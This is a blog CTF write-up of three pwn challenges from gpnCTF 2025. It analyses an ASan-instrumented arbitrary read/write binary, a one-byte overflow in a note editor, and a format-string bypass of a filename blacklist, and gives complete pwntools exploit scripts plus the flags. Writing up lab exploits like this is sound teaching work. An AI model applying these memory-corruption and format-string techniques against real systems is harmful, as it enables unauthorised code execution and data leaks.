---
title: "gpnCTF25"
date: 2025-07-06T19:26:52+02:00
tags: ["pwn"]
categories: ["ctf"]
author: "Ayman Boulaich"
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: false
summary: "The past 20th of June we had the luck to play the gpnCTF which is a Jeopardy-style Capture The Flag event organized annually by KITCTF, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: true
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: false
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

**I'm not gonna lie, writing CTF writeups just isn't my thing.**

But as an old proverb says: *"If you didn’t write it, it didn’t happen."*

So today, I want to get back to one of the things I used to do early on.

The past 20th of June we had the luck to play the **gpnCTF** which is a Jeopardy-style Capture The Flag event organized annually by **KITCTF**, often taking place at the GPN (Goulash Programming Night) conference and also available to play online. This year’s had a fun twist it was based on a Monopoly-style board game, treating challenges like properties to be bought.

![Untitled](/CTF/gpnctf25-1.png)

**KITCTF** is the CTF team from the **Karlsruhe Institute of Technology (KIT)** in Germany. Founded in **2014**, it's composed of students, cybersecurity enthusiasts, and CTF players from the KIT community. They are also known for the famous **KITCTFCTF** and for participating in competitions as **DEFCON CTF**

Before anything else, just to give some context:

I'm currently playing as part of the **418s** CTF team. 

It started as a place to casually play CTFs, but now we're trying to turn it into something more competitive.

And as a little spoiler, we’re not doing too bad! We’ve earned a respectable **62nd place** in this competition, and that’s only the beginning.

## INDEX

- [NASA](https://pwndside.github.io/posts/gpnCTF/#NASA)
- [Note Editor](https://pwndside.github.io/posts/gpnCTF/#Note-Editor)
- [no-nc](https://pwndside.github.io/posts/gpnCTF/#no-nc)

## NASA

![Untitled](/CTF/gpnctf25-2.png)

The description shown above hints us that we are dealing with **sanitizers** but without further context I am unable to know which one is being used.

![Untitled](/CTF/gpnctf25-3.png)

**ldd** shows the use of **libasan** which is the **AddressSanitizer runtime library**, part of a memory error detection tool built into compilers like **Clang** and **GCC**. It helps detect a wide range of memory-related bugs, like heap/stack overflows, use-after-free and use-after-return, also can be used to detect memory leaks.

![Untitled](/CTF/gpnctf25-4.png)

All security checks are enabled.

So before getting through **ASan sanitizations**, lets break down the code.

```c
int main(void) {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	long long option;
	provide_help(&option);
	while (1) {
		puts("[1] Write [2] Read [3] Exit");
		if (scanf("%llu", &option) != 1)
			break;
		if (option == 1) {
			puts("8-byte adress and 8-byte data to write please (hex)");
			uintptr_t addr;
			uint64_t val;
			scanf("%lx %lx", &addr, &val);
			*((uint64_t *)addr) = val;
		} else if (option == 2) {
			puts("8-byte adress to read please (hex)");
			uintptr_t addr;
			scanf("%lx", &addr);
			printf("%lx\n", *((uint64_t *)addr));
		} else if (option == 3) {
			puts(":wave:");
			break;
		} else {
			puts("Invalid option");
		}
	}
	return 0;
}
```

The `main` function begins with a prologue function called `provide_help`, which leaks two addresses (win function address and a stack address). It is then followed by a loop presenting a contextual menu that allows you to read and write memory without any restrictions, as well as an exit option to break the loop.

```c
void provide_help(void *stack_ptr) {
	printf("%p\n", stack_ptr);
	printf("%p\n", &win);
}
```

Moreover, there's a `win` function that spawn a shell, so if we can control the flow, we’re good to go.

```c
void win() {
	puts("YOU WIN!!!\n");
	system("/bin/sh");
	exit(0);
}
```

As we known the chall makes use of **AddressSanitizer** in compilation time so if we check the disassembled binary we could notice some changes on the `main` function.

![Untitled](/CTF/gpnctf25-5.png)

First thing that catch my eye is this comparison at startup checking if there is **stack use-after-return detection enabled**. As the binary takes the `loc_14c4` path, we can confirm that is enabled.

**But why is monitoring this vulnerability if our code is not vulnerable to it?**

```c
void provide_help(void *stack_ptr)
```

Returning to the `provide_help` function, it takes a stack address as an argument. As a **preventive measure**, if any function that handles stack addresses is detected, the **stack** will be **allocated on the heap** instead, allowing it to be monitored by the **sanitizer**.

![Untitled](/CTF/gpnctf25-6.png)

In `loc_139E` some type of **masking** is done at a relative address to **rbp**.

This mask targets addresses on the **heap-allocated** *stack,* **ASan** maintains a **shadow memory**, where the mask is written, to track whether memory is valid or poisoned. Making sure **no** function reads or writes into the poisoned addresses.

![Untitled](/CTF/gpnctf25-7.png)

To summarize, we have two crucial leaks: the address of the `win` function and a stack address (in this case, from the heap-allocated stack). Additionally, we have **arbitrary read and write** capabilities, as long as the target addresses aren’t poisoned. This is because the **ASan** mask only affects **heap-allocated stack** frames, which are the ones susceptible to stack use-after-return detection.

Before diving into the exploitation phase, I usually like to plan my approach.

The presence of a `win` function leak suggests that we have control over **PIE**, which we can leverage to leak the address of `puts` from the **GOT**. This leak will allow us to compute the base address of libc.

From here, it's a win-win case. With the libc base address, we can calculate the address of the `environ` pointer, which points to a stack address. This allows us to derive the return address of a function on the stack, and that’s what we’re going to overwrite in order to **hijack the control flow**.

```python
from pwn import *

exe = ELF("./nasa")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])

def start(argv=[], *a, **kw):
    if args.GDB: # GDB
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote("lakeforge-of-mind-blowing-hope.gpn23.ctf.kitctf.de", "443", ssl=True)
    
    
gdbscript = '''
disp/10i $rip
tb main
continue
'''.format(**locals())

# Write primitive
def write(addr, data):
    io.sendlineafter(b'[1] Write [2] Read [3] Exit\n', b'1')
    io.recvuntil(b'8-byte adress and 8-byte data to write please (hex)\n')
    io.sendline(addr)
    io.sendline(data)

# Read primitive
def read(addr):
    io.sendlineafter(b'[1] Write [2] Read [3] Exit\n', b'2')
    io.recvuntil(b'8-byte adress to read please (hex)\n')
    io.sendline(addr)
    return io.recvline().strip()

# Exit primitive
def exit():
    io.sendlineafter(b'[1] Write [2] Read [3] Exit\n', b'3')

io = start()

# Leak addresses
asan_heap = int(io.recvline().strip(), 16)
win_addr = int(io.recvline().strip(), 16)

# Compute PIE
exe.address = win_addr - 0x1309
log.info(f'exe base: {hex(exe.address)}')

# Leak libc address
puts_addr = read(hex(exe.got['puts']))
log.info(f'puts_addr: {hex(int(puts_addr, 16))}')

# Compute libc base
libc.address = int(puts_addr, 16) - 0x265a12
log.info(f'libc base: {hex(libc.address)}')

# Leak stack address
environ_addr = libc.symbols['environ']
log.info(f'environ_addr: {hex(environ_addr)}')

# Compute return address
rip_addr = int(read(hex(environ_addr)), 16) - 0x130

# Hijack the control flow
write(hex(rip_addr), hex(win_addr + 0xa))

# Trigger the win function
exit()

io.interactive()
```

![Untitled](/CTF/gpnctf25-8.png)

> GPNCTF{all_WR1te5_4Re_PrO7EcteD_By_AsaN_oN1Y_in_Y0UR_dreamS_9438}
> 

Wrapping up, **ASan** is a debugging tool, not a security boundary. It helps developers catch bugs during testing, but it's not reliable for protecting a binary against exploitation. Arbitrary read/write breaks the entire threat model that **ASan** operates under.

![Running-Away-Balloon(1).jpg](attachment:44def19c-f123-4111-9c31-01886ac98ce7:Running-Away-Balloon(1).jpg)

## Note Editor

![Untitled](/CTF/gpnctf25-9.png)

Not much to take away from this description but it seems to be some sort of note-taking app.

![Untitled](/CTF/gpnctf25-10.png)

Everything seems disabled wasn’t expecting less from an entry level challenge.

From this line in the challenge's **Dockerfile**, we can see that `lib.c` and `main.c` are compiled together into a single executable.

```docker
RUN gcc lib.c main.c -o chall -fno-stack-protector -fno-pie -no-pie
```

Once executed the following **contextual menu** is shown.

```bash
Welcome to the terminal note editor as a service.
Choose your action:
1. Reset note
2. View current note
3. Append line to note
4. Edit line at offset
5. Truncate note
6. Quit
```

Let’s dig into the code.

The first thing I noticed was that `lib.c` overrides the standard `fgets` function with its own custom implementation. This is interesting, as it could introduce a specific vulnerability related to how `fgets` behaves, worth to mention that it **does not null-terminate** the string. Additionally, a `win` function is implemented, making it easier to hijack the control flow once code execution is achieved. 

```c
#include <stdio.h>
#include <unistd.h>

char *fgets(char* s, int size, FILE *restrict stream) {
    char* cursor = s;
    for (int i = 0; i < size -1; i++) {
        int c = getc(stream);
        if (c == EOF) break;
        *(cursor++) = c;
        if (c == '\n') break;
    }
    // *cursor = '\0'; // our note is always null terminated
    return s;
}

void win() {
    execve("/bin/sh", NULL, NULL);
}

```

The following **macro**, which may appear in the code, reads an entire line from stdin using `getline` and parses it with `sscanf` according to the given format and arguments.

```c

#define SCANLINE(format, args) \
    ({ \
    char* __scanline_line = NULL; \
    size_t __scanline_length = 0; \
    getline(&__scanline_line, &__scanline_length, stdin); \
    sscanf(__scanline_line, format, args); \
    })
```

The key thing in `main.c` is the `edit` function, which takes a `Note*` struct as an argument. It prompts the user for an offset and a length, and is responsible for editing the note's buffer starting at the given offset for up to `length` bytes. While some checks are performed on the **user-controlled values**, they are ultimately ineffective as `fgets` takes `lenght + 2` bytes and does not explicitly **null-terminate** the last byte if the input length is large enough, potentially allowing a **one-byte overflow** past the end of the buffer.

```c
void edit(Note* note) {
    printf("Give me an offset where you want to start editing: ");
    uint32_t offset;
    SCANLINE("%u", &offset);
    printf("How many bytes do you want to overwrite: ");
    int64_t length;
    SCANLINE("%ld", &length);
    if (offset <= note->pos) {
        uint32_t lookback = (note->pos - offset);
        if (length <= note->budget + lookback) {
            fgets(note->buffer + offset, length + 2, stdin); // plus newline and null byte
            uint32_t written = strcspn(note->buffer + offset, "\n") + 1;
            if (written > lookback) {
                note->budget -= written - lookback;
                note->pos += written - lookback;
            }
        }
    } else {
        printf("Maybe write something there first.\n");
    }
}
```

```c
#define NOTE_SIZE 1024
struct Note {
    char* buffer;
    size_t size;
    uint32_t budget; 
    uint32_t pos; 
};
typedef struct Note Note;
```

This **vulnerability** on its own isn't particularly dangerous, but since the next item on the stack is the **buffer pointer** within the `Note` struct, it gives us the ability to overwrite one byte of that address, effectively letting us redirect where the note writes to.

```c
int main() {
    Note note;
    char buffer[NOTE_SIZE];
    ..... more code .....
```

Alright, as usual, let's outline a plan. We'll start by editing the note from offset 0 up to `NOTE_SIZE`, which lets us modify a single byte of the note's buffer pointer. This shift pushes the pointer further in memory, giving us the ability to freely overwrite the return address.

The next question is: **How many bytes can we overwrite once the pointer has been shifted?** 

That depends on the stack layout, as the least significant byte of the **buffer address** varies between executions. The number of bytes we’re allowed to write ”our budget" is determined by subtracting the current `written` and `loopback` value from the **previous budget**. This `written` value is computed using `strcspn`, which scans the buffer until it encounters a newline or, in our case, the first null byte at the end of the shifted buffer pointer. `lookback` represents how far the write pointer has been shifted **backwards** from the **current logical position**, in our case is zero.

```c
uint32_t written = strcspn(note->buffer + offset, "\n") + 1;
```

```c
uint32_t lookback = (note->pos - offset);
```

```c
note->budget -= written - lookback;
```

Is worth to mention the actual **position** of the note is updated in a similar way

```c
note->pos += written - lookback;
```

So once we got the **buffer pointer** shifted we can use the following function which is very handy which appends data at the end of the buffer, the only thing here to have care about is to put a **null byte** at the end of the **buffer pointer**.

```c
void append(Note* note) {
    printf("Append something to your note (%u bytes left):\n", note->budget);
    fgets(note->buffer + note->pos, note->budget, stdin);
    uint32_t written = strcspn(note->buffer + note->pos, "\n") + 1;
    note->budget -= written;
    note->pos += written;
}
```

```python
from pwn import *

exe = ELF("./chall")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])

def start(argv=[], *a, **kw):
    if args.GDB: # GDB
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote("ironview-of-constant-abundance.gpn23.ctf.kitctf.de", "443", ssl=True)
    
    
gdbscript = '''
disp/10i $rip
tb main
continue
'''.format(**locals())

def append(data):
    io.sendlineafter(b'6. Quit\n', b'3')
    io.sendlineafter(b'Append something to your note', data)

def edit(offset, length, data):
    io.sendlineafter(b'6. Quit\n', b'4')
    io.sendlineafter(b'Give me an offset where you want to start editing: ', offset)
    io.sendlineafter(b'How many bytes do you want to overwrite: ', length)
    io.send(data)

def exit():
    io.sendlineafter(b'6. Quit\n', b'6')

io = start()

edit(b'0', b'1024', b'A'*1024 + b'\xff')

append(b'\x00' + p64(0x0)*3 + b'A'*0x10 + p64(exe.sym.win))

exit()

io.interactive()

```

![Untitled](/CTF/gpnctf25-11.png)

> GPNCTF{NOw_y0U_5uRE1y_are_REaDY_to_Pwn_14DyBird!}
> 

## no-nc

![Untitled](/CTF/gpnctf25-12.png)

![Untitled](/CTF/gpnctf25-13.png)

Only ASLR enabled this time.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#define RAW_FLAG "GPNCTF{fake_flag}"

char *FLAG = RAW_FLAG;
```

First of all, the code defines a **macro** containing a **hardcoded flag.**

Let’s breakdown the **main function.**

```c
int main(int argc, char **argv)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    char buf[200] = {};
    puts("Give me a file to read");
    read(STDIN_FILENO, buf, (sizeof buf) - 1);
    buf[sizeof buf - 1] = '\0';
```

The function starts by asking for a file name, which is then stored in the `buf` variable.

```c
    size_t str_len = strlen(buf);
    for (size_t i = 0; i < str_len; i++)
    {
        if (no(buf[i]))
        {
            puts("I don't like your character!");
            exit(1);
        }
    }
```

The `no` function is called in a loop over every character in the **user-provided input**  `buf` , and if any disallowed character is found, the program exits.

```c

int no(char c)
{
    if (c == '.')
        return 1;
    if (c == '/')
        return 1;
    if (c == 'n')
        return 1;
    if (c == 'c')
        return 1;
    return 0;
}
```

`no` is a **character blacklist** to limit how the file name can be constructed, likely as a weak form of input sanitization.

```c
    char *filename = calloc(200, 1);
    snprintf(filename, (sizeof filename) - 1, buf); // format string vuln
    puts("Will open:");
    puts(filename);
```

A **format string vulnerability** is clearly present in the `snprintf` call, which uses the contents of `buf` directly as the format string when copying into `filename`. However, there is a limitation because the size argument passed to `snprintf` is incorrect as it returns the size of the pointer itself, not the allocated buffer, since `filename` is not dereferenced. This mistake restricts how much data `snprintf` can safely write.

```c
    int fd = open(filename, 0);
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }
    while (1)
    {
        int count = read(fd, filebuf, (sizeof filebuf) - 1);
        if (count > 0)
        {
            write(STDOUT_FILENO, filebuf, count);
        }
        else
        {
            break;
        }
    }
}
```

The function ends by opening the specified file and reading its content.

As is known in Linux **EVERYHING** is a file; regular files, executables, directories, and even devices are files, why not leak the content of the **binnary itself** to get the **hardcoded flag.**

![Untitled](/CTF/gpnctf25-14.png)

![Untitled](/CTF/gpnctf25-15.png)

As expected, the **blacklist** targets characters that make up the **binary’s name**.

![Untitled](/CTF/gpnctf25-16.png)

From here, I found two ways of **bypassing the sanitization**, both relying on the **format string vulnerability.**

<aside>
💡

What is a **format string vulnerability**?

A **format string vulnerability** is a type of security bug that occurs when an attacker is able to control the format string argument of a function like `printf`, `sprintf`, `snprintf`, or similar formatting functions in C/C++. You can learn more about format string vulnerabilities [here](https://owasp.org/www-community/attacks/Format_string_attack)

</aside>

### EASY WAY

Since **argv[0]** is a pointer to the **executable name** and the stack always has a reference to that pointer we could abuse the **format string specifiers** to bypass the sanitizer with **$s.**

```python
from pwn import *

exe = ELF("./nc")

context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])

def start(argv=[], *a, **kw):
    if args.GDB: # GDB
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote("mounttown-of-uncomfortably-powerful-unity.gpn23.ctf.kitctf.de", "443", ssl=True)
    
gdbscript = '''
disp/10i $rip
tb main
continue
'''.format(**locals())

io = start()

io.sendlineafter('Give me a file to read\n', f"%129$s\0")

leaks = set(io.clean().split())

for leak in leaks:
    if b'GPN' in leak:
        log.info(f'Leak: {leak}')
        break
io.interactive()
```

### HARD WAY

As we have control of the format and the binary **only** **sanitize** characters before **first null byte**, we could try to construct the filename **character by characte**r abusing **$C.**

```python
from pwn import *

exe = ELF("./nc")

context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])

def start(argv=[], *a, **kw):
    if args.GDB: # GDB
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
    
gdbscript = '''
disp/10i $rip
tb main
continue
'''.format(**locals())

io = start()

io.sendlineafter('Give me a file to read\n', f"%11$C%12$C\0\0\0\0\0\0\0\0n\0\0\0\0\0\0\0c\0\0\0\0\0\0\0")

leaks = set(io.clean().split())

for leak in leaks:
    if b'GPN' in leak:
        log.info(f'Leak: {leak}')
        break
io.interactive()
```

![Untitled](/CTF/gpnctf25-17.png)

![Untitled](/CTF/gpnctf25-18.png)

> GPNCTF{uP_AND_dowN_4Ll_4round_6oEs_7H3_N_dImEn51onAl_c1rClE_WTf_IS_Thi5_F14G}
>
